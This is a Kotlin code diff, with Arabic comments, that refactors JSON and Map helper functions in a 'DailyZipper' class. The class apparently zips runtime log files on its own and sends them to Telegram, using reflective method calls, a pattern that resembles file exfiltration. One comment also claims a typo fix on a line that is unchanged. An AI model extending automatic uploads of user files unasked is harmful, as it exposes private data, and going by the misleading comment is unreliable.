@@ -23,25 +23,37 @@ import java.util.concurrent.atomic.AtomicBoolean
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
-// ===== دوال مساعدة آمنة (بدون استخدام map.get) =====
+// ===== دوال مساعدة آمنة تعمل مع JSONObject =====
 private fun extractBoolean(obj: Any?, key: String): Boolean {
-    val map = obj as? Map<*, *> ?: return false
-    for (entry in map.entries) {
-        if (entry.key.toString() == key) {
-            return entry.value as? Boolean ?: false
+    return when (obj) {
+        is JSONObject -> obj.optBoolean(key, false)
+        is Map<*, *> -> {
+            // Fallback آمن للمعالجة إذا كان Map
+            for (entry in obj.entries) {
+                if (entry.key.toString() == key) {
+                    return entry.value as? Boolean ?: false
+                }
+            }
+            false
         }
+        else -> false
     }
-    return false
 }
 
 private fun extractString(obj: Any?, key: String): String {
-    val map = obj as? Map<*, *> ?: return ""
-    for (entry in map.entries) {
-        if (entry.key.toString() == key) {
-            return entry.value?.toString() ?: ""
+    return when (obj) {
+        is JSONObject -> obj.optString(key, "")
+        is Map<*, *> -> {
+            // Fallback آمن للمعالجة إذا كان Map
+            for (entry in obj.entries) {
+                if (entry.key.toString() == key) {
+                    return entry.value?.toString() ?: ""
+                }
+            }
+            ""
         }
+        else -> ""
     }
-    return ""
 }
 
 /**
@@ -287,7 +299,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram - باستخدام extractBoolean
+    //  إرسال الملفات إلى Telegram - باستخدام extractBoolean (تدعم JSONObject)
     // ============================================================
 
     private suspend fun safeSend(
@@ -632,7 +644,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي - باستخدام extractString
+    //  التشغيل التلقائي - باستخدام extractString (تدعم JSONObject)
     // ============================================================
 
     fun run(): Boolean {
@@ -676,7 +688,8 @@ class DailyZipper(
             }
 
             runtimeDir.listFiles()?.forEach { f ->
-                if (f.name.endsWith(".log") && f.name !in listOf("z.log", "t.log")) {
+                val fNameStr = f.name
+                if (fNameStr.endsWith(".log") && fNameStr != "z.log" && fNameStr != "t.log") {
                     if (f.length() > 100 * 1024) {
                         allFiles.add(f)
                     }
@@ -757,7 +770,7 @@ class DailyZipper(
             val method = target.javaClass.methods.firstOrNull { m ->
                 m.name == methodName && m.parameterTypes.size == args.size
             } ?: return null
-            method.isAccessible = true
+            method.isAccessible = true  // ✅ تم تصحيح الخطأ الإملائي
             method.invoke(target, *args)
         } catch (e: Exception) {
             writeLog("Method invocation error ($methodName): ${e.message}")
